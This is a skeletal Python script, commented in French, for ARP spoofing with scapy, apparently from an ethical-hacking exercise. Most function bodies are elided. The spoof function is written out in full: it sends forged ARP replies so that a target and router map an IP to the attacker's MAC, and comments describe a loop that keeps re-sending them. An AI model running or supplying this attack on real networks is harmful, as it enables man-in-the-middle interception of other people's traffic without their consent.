...
#fonction qui va permettre a l'utilisateur de saisir les arguments
def get_arguments():
...
#fonction qui va creer une requete ARP afin de saisir l'adresse MAC.
def get_mac(ip):
...
#fonction qui va spoof l'adresse MAC du target ip et du routeur 
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    #une reponse va etre envoyer vers l'adresse ip correspondante
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#fonction qui va reinitialiser la table ARP pour le routeur et du target
...
try:
    ...
    #tant que c'est vrai, envoie des packets pour spoof
    while True:
